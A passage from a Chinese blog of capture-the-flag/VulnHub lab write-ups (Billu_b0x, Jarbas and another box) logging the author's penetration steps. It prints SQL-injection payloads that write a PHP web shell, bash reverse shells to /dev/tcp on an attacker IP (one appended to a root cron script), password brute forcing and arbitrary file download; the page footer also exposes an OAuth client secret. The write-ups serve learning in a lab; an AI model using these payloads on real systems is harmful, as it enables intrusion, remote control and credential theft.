+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; union select &quot;<span class="operator">&lt;</span>?php <span class="keyword">system</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]);?<span class="operator">&gt;</span>&quot;,&quot;&quot;,&quot;&quot; into outfile &quot;<span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>uploads<span class="operator">/</span>shell.php&quot;;-- -</span><br></pre></td></tr></table></figure>
+
+<p>然后访问 uploads&#x2F;shell.php?cmd&#x3D;ls </p>
+<p>这样的话，完全可以去cat一下主要的php文件，可能得到phpmyadmin的账号和密码，进而直接查看到表的内容</p>
+<p><strong>反弹shell</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; union select &quot;<span class="operator">&lt;</span>?php <span class="keyword">exec</span>(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/攻击者ip/1234 0&gt;&amp;1&#x27;\&quot;);?<span class="operator">&gt;</span>&quot;,&quot;&quot;,&quot;&quot; into outfile &quot;<span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>uploads<span class="operator">/</span>shell.php&quot;;-- -</span><br></pre></td></tr></table></figure>
+
+<p>然后攻击机终端去监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>
+
+<p>拿到shell</p>
+</li>
+</ol>
+<h1 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h1><p>嘶，做这个感觉没意思了，真的，实战中给你这么搞，把信息写到一个main.gif里面？</p>
+<p>以后这样的我不做了</p>
+<p>本质上是个hydra+注入+提权的思路</p>
+<ol>
+<li>端口扫描，有80找80</li>
+<li>路径爆破无果，有phpmyadmin没凭证不行，从图片入手，exiftool分析图片</li>
+<li>得到路径信息，访问后需要key，对http的表单用hydra进行爆破</li>
+<li>有与数据库交互的点，想到sql注入，闭合判断，存在注入；</li>
+<li>此时有三种方法：a.查询得到表内容(sqlmap)；b.上传小马；c.反弹shell</li>
+<li>对密码进行base64解码，再john破解</li>
+<li>提权，sudo&#x2F;sbin&#x2F;，在sbin发现一个文件，软链接巴拉巴拉，提权</li>
+</ol>
+<p>关于小马上传，这个还是依靠信息收集，我namp的时候就没扫出来uploads文件，这个还是得考虑全</p>
+<p>关于into outfile这个为什么不先查前提条件(secure_file_priv的值不是NULL)，这个东西，从实战思想看，一般<strong>从果找因</strong></p>
+<p>当然，这次提权方面不太懂，先接受这个设定吧，现在脑子转不过来了</p>
+<h1 id="九、Billu-b0x"><a href="#九、Billu-b0x" class="headerlink" title="九、Billu_b0x"></a>九、Billu_b0x</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -sS -p- 192.168.1.187  <span class="comment">#22,80</span></span><br><span class="line">nmap --min-rate 10000 -sS -p22,80 -sC -sV -O 192.168.1.187</span><br><span class="line">nmap --script=vuln -p22,80 192.168.1.187,</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231125112746829.png" alt="输入账号密码"></p>
+<p>先万能密码，好的，不行</p>
+<h3 id="爆破目录"><a href="#爆破目录" class="headerlink" title="爆破目录"></a>爆破目录</h3><p>dirb一波，仅仅是用common字典，都是400</p>
+<p>回到页面，发现也是400页面，好好好，但是我用hackerbar发个post请求，可以显示，好好好</p>
+<p>将上面的路径post请求一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.187/add</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231125113712750.png" alt="上传文件"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.187/test</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231125113748748.png"></p>
+<p>嘶，突然又400了，都400了，那个SQL页面也回不去了，6</p>
+<p>重开一个浏览器，都可以访问了，不需要post，6</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.187/in</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231125114900782.png"></p>
+<p>好好好，这样的话，看看敏感路径，用那个file去下载文件</p>
+<p><img src="/../../../Typora/img111/image-20231125115204707.png"></p>
+<p><img src="/../../../Typora/img111/image-20231125115052585.png" alt="发现webmaster"></p>
+<h3 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h3><p>file参数，要post提交</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd可以下载到</span><br><span class="line">上面的路径也都可以，但没什么有效信息</span><br></pre></td></tr></table></figure>
+
+<p>那没办法，就走文件上传的路吧，嘶，上传成功，但是不知道路径嘞</p>
+<p>那我没招了啊</p>
+<p>看了下wp，好好好，跟我搞这个</p>
+<blockquote>
+<p>用test去下载 add.php、test.php、show.php等源码</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=/var/www/index.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231125150020889.png"></p>
+<p>它把单引号替换为空了，而且还进行了解url编码处理</p>
+<p>换个php文件看，</p>
+<p>可以，c.php给了mysql的凭证<img src="/../../../Typora/img111/image-20231125150749845.png" alt="image-20231125150749845"></p>
+<p>但是phpmyadmin在哪嘞</p>
+<p>命令行连接也不现实，毕竟没有扫到3306端口，ssh也不行</p>
+<p>用dirb的大字典扫一下，发现了一个 <code>phpmy</code>目录</p>
+<p><img src="/../../../Typora/img111/image-20231125153406332.png"></p>
+<p>这个应该是首页凭证了</p>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>有两个功能，显示图片和上传图片</p>
+<p><img src="/../../../Typora/img111/image-20231125153706191.png"></p>
+<p>好，f12可知道图片路径</p>
+<p>上传图片尝试后，发现代码会对内容检测，哦，我不是有代码吗</p>
+<p><img src="/../../../Typora/img111/image-20231125154420319.png"></p>
+<p>嘶，单纯改后缀那些方法确实不行，图片码的话，算了，没有.htaccess</p>
+<p>回到phpmyadmin</p>
+<p><code>SHOW VARIABLES LIKE &#39;%secure%&#39;</code>，那就不能写文件了</p>
+<p><img src="/../../../Typora/img111/image-20231125155816937.png"></p>
+<p>怎么办？扫了一些文件，没看出什么</p>
+<p>那还是回到图片上传</p>
+<p>上传一个正常图片，但是里面内容用burpsuite添加一个一句话木马</p>
+<p><code>&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;</code></p>
+<p>访问图片地址，什么意思，bp抓不到，直接cmd&#x3D;也没有</p>
+<p>那就当点击show那一块的按钮时，抓个包，更改一下包</p>
+<p><img src="/../../../Typora/img111/image-20231125162345345.png"></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>既然这样的话，构建一个bash反弹</p>
+<p><code>bash -i &gt;&amp; /dev/tcp/192.168.1.109/1234 0&gt;&amp;1</code></p>
+<p>下面这个才可以</p>
+<p><code>echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.109/1234 0&gt;&amp;1&quot; | bash</code></p>
+<p><img src="/../../../Typora/img111/image-20231125163256959.png"></p>
+<p>里面找了找，在phpmy下，有一个配置文件</p>
+<p><img src="/../../../Typora/img111/image-20231125163453874.png"></p>
+<p>ssh连接进去</p>
+<p>是root用户啊，但是flag.txt没有，ifconfig也没其它网段</p>
+<p>但是它有三个ipv6</p>
+<p><img src="/../../../Typora/img111/image-20231125163831377.png"></p>
+<p>为什么不全局找一下呢</p>
+<p><img src="/../../../Typora/img111/image-20231125164143863.png"></p>
+<p>这里面每个flags的内容都很短，估计是拼接起来的，不搞了，反正获得了root的终端，没了</p>
+<h2 id="补充-2"><a href="#补充-2" class="headerlink" title="补充"></a>补充</h2><p>1.对于已知index.php的源代码那一块</p>
+<p>可以用万能密码 <code>&#39; or 1=1 -- \</code>，也是可以进去的</p>
+<p>2.对于<strong>文件包含</strong>那一块，可以命令行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST --data <span class="string">&quot;file=./index.php&quot;</span> http://192.168.1.187/test <span class="comment">#可以得到源码</span></span><br></pre></td></tr></table></figure>
+
+<p>它有一些常规的名字，index.php、show.php，都可以尝试一下，试试又不吃亏</p>
+<p>3.当上传了一句话，去单独访问图片所在链接抓不了包时，首先想到panel.php，因为这个页面包含了所有图片的信息，去刷新抓包，发现post有个load参数，尝试文件包含</p>
+<p>4.这个反弹shell语句不定，可以去php反弹shell大全搜索，随便用一个，将空格用加号替换即可</p>
+<p>5.在获取到webshell的时候，不通过配置文件获得信息也是可以的，</p>
+<p><code>uname -a</code>得到的是内核信息，可以采取内核提权</p>
+<h2 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h2><p>本质是一个目录爆破+任意文件下载+代码审计+敏感信息泄露</p>
+<ol>
+<li>字典尽可能用大一点的，爆破后有一个test路径，有提示接收file参数</li>
+<li>大胆猜测，这是个输入路径就可以下载文件的页面，get没用，post请求，除了bp等工具，也可以用 <code>curl -X POST --data</code></li>
+<li>这时候再大胆猜测，将爆破的那些路径，加个后缀php，期望得到源码，结果是可以的</li>
+<li>在index.php发现了对输入的过滤格式，可以针对性绕过；也可以在c.php直接找到mysql的凭证</li>
+<li>如果字典没有爆出phpmyadmin的真实文件夹，就用不了，所以可以根据步骤4，直接绕过进入panel.php；当然如果爆破出来了，就可以找到真实的凭证直接进去panel.php</li>
+<li>一句话木马上传，发现直接访问图片路径不可以触发bp拦截或者一句话木马</li>
+<li>想到panel.php是可以显示所有图片的，猜测它是有可以访问指定图片的权利，抓包验证得到，load参数可以指定图片</li>
+<li>接下来用一句话木马 反弹shell，得到webshell</li>
+<li>敏感文件信息直接ssh root，或者内核提权</li>
+</ol>
+<h1 id="十、jarbas"><a href="#十、jarbas" class="headerlink" title="十、jarbas"></a>十、jarbas</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --min-rate 10000 -sT -Pn -p- 192.168.1.163</span><br><span class="line">sudo nmap -sT -sV -sC -O -p22,80,3306,8080 192.168.1.163</span><br><span class="line">sudo nmap --script=vuln -p80,3306,8080,22 192.168.1.163 </span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231126125049752.png" alt="image-20231126125049752"></p>
+<p>访问80端口</p>
+<p><img src="/../../../Typora/img111/image-20231126122853671.png" alt="image-20231126122853671"></p>
+<p>好好好，看不懂，对于输入框输入后，点击，Not Found，换8080端口</p>
+<p>这是个后台管理页面</p>
+<p><img src="/../../../Typora/img111/image-20231126121624866.png" alt="image-20231126121624866"></p>
+<p> <code>Jenkins ver. 2.113</code>，那考虑是cms</p>
+<p>先dirb一波，嘶，没什么东西，加后缀html、php，也没什么，登录抓个包</p>
+<p><img src="/../../../Typora/img111/image-20231126121105890.png"></p>
+<p>不知道，这个端口有robots.txt，看看，没什么有用的信息</p>
+<p>那还是回到80端口，打开bp，到处点点点</p>
+<p>查看历史http，发现很多点不开的都是另一个199开头的ip，而192开头的，能点的都404了</p>
+<p><img src="/../../../Typora/img111/image-20231126123707045.png"></p>
+<p>啊，那我没办法了</p>
+<p>换字典！！！！！！！！！！！！！！</p>
+<p>哦，我加后缀弄错了，没有加.</p>
+<p><code>dirb http://192.168.1.163 -X ,.html,.php </code>，得到一个access.html</p>
+<p><img src="/../../../Typora/img111/image-20231126132746293.png"></p>
+<p>用<code>hash-identifier</code> 识别一下类型，然后john破解</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john -w=/usr/share/john/rockyou.txt /tmp/test.txt --format=Raw-MD5  <span class="comment">#italia99 、marianna、vipsu</span></span><br></pre></td></tr></table></figure>
+
+<p>都不是ssh的，那考虑mysql</p>
+<p><code>mysql-h 主机ip地址-uroot -p show databases</code></p>
+<p><img src="/../../../Typora/img111/image-20231126134520405.png"></p>
+<p>那8080端口呢，也失败了</p>
+<p>考虑 <strong>密码复用</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec ssh 192.168.1.163 -u /tmp/user.txt -p /tmp/passwd.txt --continue-on-success</span><br></pre></td></tr></table></figure>
+
+<p>没用</p>
+<p>啧，忘了那个8080的登录了，尝试eder和vipsu可以登录</p>
+<p><img src="/../../../Typora/img111/image-20231126141831019.png"></p>
+<p>看了一会儿可以建立build之类的项目，可以执行shell诶</p>
+<p><img src="/../../../Typora/img111/image-20231126142520360.png"></p>
+<p>攻击机监听，然后web上执行这个build</p>
+<p><img src="/../../../Typora/img111/image-20231126142652841.png"></p>
+<h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">sudo -l</span><br><span class="line">find / -perm -u=s </span><br><span class="line"><span class="comment">#无果</span></span><br><span class="line"><span class="comment">#查看计划任务</span></span><br><span class="line"><span class="built_in">cat</span> /etc/contab</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231126143003590.png" alt="5分钟执行一次"></p>
+<p><img src="/../../../Typora/img111/image-20231126143102344.png" alt="它这个是删除日志"></p>
+<p>而且这个脚本是可修改的，所以vim下</p>
+<p>(我服了，这好难改啊，还把原内容覆盖到了，而且#!&#x2F;bin&#x2F;bash怎么写都报错)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/bash –i &gt;&amp; /dev/tcp/192.168.1.109/1234 0&gt;&amp;1&quot;</span> &gt;&gt; Cl*</span><br></pre></td></tr></table></figure>
+
+<p>然后kali这边监听这端口就是了</p>
+<p><img src="/../../../Typora/img111/image-20231126150019103.png"></p>
+<p>嘶，换一个语句</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.1.109/1234 0&gt;&amp;1&quot;</span> &gt;&gt;Cl*</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231126150510466.png"></p>
+<h2 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a>总结</h2><ol>
+<li><p>有80,22,3306,8080端口</p>
+</li>
+<li><p>80端口是个页面，8080端口是后台登录页面，3306是拒绝远程连接的，22最后尝试了是没有的</p>
+</li>
+<li><p><strong>主要切入点在字典爆破</strong>这里，要有一个好的字典，而且还要想到是对特定后缀html、php的扫描等，这个access.html扫不出来就没办法了</p>
+<p>要么加参数，要么换字典换工具</p>
+</li>
+<li><p>之后对密码进行解密，hashes.com也可以，</p>
+<p>还要<strong>想到用户名和密码可能是错位的</strong></p>
+</li>
+<li><p>ssh、mysql尝试都失败了，去8080端口登入，进入后台</p>
+</li>
+<li><p><strong>找到上传点</strong>，有一个build project，它的编辑页面可以执行shell，输入shell，攻击机监听</p>
+</li>
+<li><p>得到websehll，尝试提权，最终发现crontab有一个脚本，以root身份每五分钟执行一次</p>
+</li>
+<li><p>添加反弹shell语句，攻击机监听得到rootshell</p>
+</li>
+</ol>
+<p><strong>学到了</strong>：</p>
+<p>上面那个密码排列组合，最好用<strong>burpsuite的intruder集束炸弹爆破</strong>即可</p>
+<p>以后加脚本就不要vim进去，直接echo添加进去即可</p>
+<h1 id="问题解决-kali无ip"><a href="#问题解决-kali无ip" class="headerlink" title="问题解决-kali无ip"></a>问题解决-kali无ip</h1><p>kali挂起后了一会儿，启动，kali网络不可达，ifconfig，eth0没地址</p>
+<p>去设置的文件看，auto eth0 ….dhcp没问题啊</p>
+<p><a target="_blank" rel="noopener" href="http://t.csdnimg.cn/zvo07">解决方案</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/network/interfaces</span><br><span class="line"></span><br><span class="line">/etc/resolv.conf</span><br><span class="line"></span><br><span class="line"> ifconfig eth0 up </span><br></pre></td></tr></table></figure>
+
+<p>去网络编辑器，把vmet0的桥接模式的<strong>自动</strong>改为 物理机的wlan，(<strong>Realtek</strong>)</p>
+<blockquote>
+<p>这个vmet0，可能自己没了，需要添加</p>
+</blockquote>
+<p>kali重启或者 <code>sudo service networking restart</code>，这个时候会有ip，可以联网(搜东西)，就是ping不了，但是<code>netdiscover</code>可以用了，无所谓了</p>
+<blockquote>
+<p>我不禁想问，这些问题的出现，是在劝我不要走这条路，还是说在考验我呢？</p>
+</blockquote>
+<h1 id="问题解决之-sublime"><a href="#问题解决之-sublime" class="headerlink" title="问题解决之-sublime"></a>问题解决之-sublime</h1><p>dirb扫完后，比如选择含有CODE的行，输入正则</p>
+<p><code>(?!.*CODE:200).+</code></p>
+<h1 id="提权方式"><a href="#提权方式" class="headerlink" title="提权方式"></a>提权方式</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a <span class="comment">#脏牛提权</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null <span class="comment">#找sbin文件</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab <span class="comment">#定时任务</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span> <span class="comment">#环境变量提权</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>以低权限修改可执行文件&#x2F;脚本，却以高权限运行可执行文件&#x2F;脚本</strong></p>
+<h1 id="ftp上传或下载文件的过程"><a href="#ftp上传或下载文件的过程" class="headerlink" title="ftp上传或下载文件的过程"></a>ftp上传或下载文件的过程</h1><ol>
+<li>USER user指定用户名</li>
+<li>PASS passwd指定密码</li>
+<li>SIZE file.txt返回指定文件大小</li>
+<li>CWD dirname改变工作目录</li>
+<li>PORT 告诉ftp服务器客户端监听的端口号</li>
+<li>RETR 下载文件</li>
+<li>STOR 上传文件</li>
+<li>REST 略过指定点后的数据</li>
+<li>QUIT 断开连接</li>
+</ol>
+<h1 id="工具-crackmapexec"><a href="#工具-crackmapexec" class="headerlink" title="工具-crackmapexec"></a>工具-crackmapexec</h1><p>kali自带，可用来自动化爆破，指定用户名txt和密码txt，进行爆破，<a target="_blank" rel="noopener" href="https://blog.csdn.net/Jack0610/article/details/131102720">使用教程</a></p>
+<h1 id="nmap命令"><a href="#nmap命令" class="headerlink" title="nmap命令"></a>nmap命令</h1><p>向“红队笔记”看齐，统一以下命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.1.0/24</span><br><span class="line">nmap --min-rate 10000 -p- 192.168.1.x</span><br><span class="line">nmap -sT -sC -sV -O -p80,22,333,444 192.168.1.x</span><br><span class="line">nmap --script=vuln -p80,135 ip</span><br></pre></td></tr></table></figure>
+
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/09/13/vulhub/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vulhub/" rel="tag">vulhub</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2023/09/16/Lamp1/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            LAMPSECURITY:CTF4
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2023/09/08/%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">常见攻击步骤</div>
+      </a>
+    
+  </nav>
+
+  
+   
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.css">
+
+
+<script src="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.js"></script>
+
+
+<script src="https://cdn.staticfile.org/blueimp-md5/2.19.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '93da8388ad1469a8be66',
+    clientSecret: '9dea6314b14ae1877632f2bcbe0a639dd4485bb1',
+    repo: 'blogtalk',
+    owner: 'ak005469075',
+    admin: ['ak005469075'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+
+  
+    
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2023-2024
+        <i class="ri-heart-fill heart_icon"></i> 是羽泪云诶
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/favicon.ico" alt="小张之栈"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+  <script type="text/javascript">
+$(function () {
+    console.log("lets go！");
+    console.log("/");
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+</div>
+
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
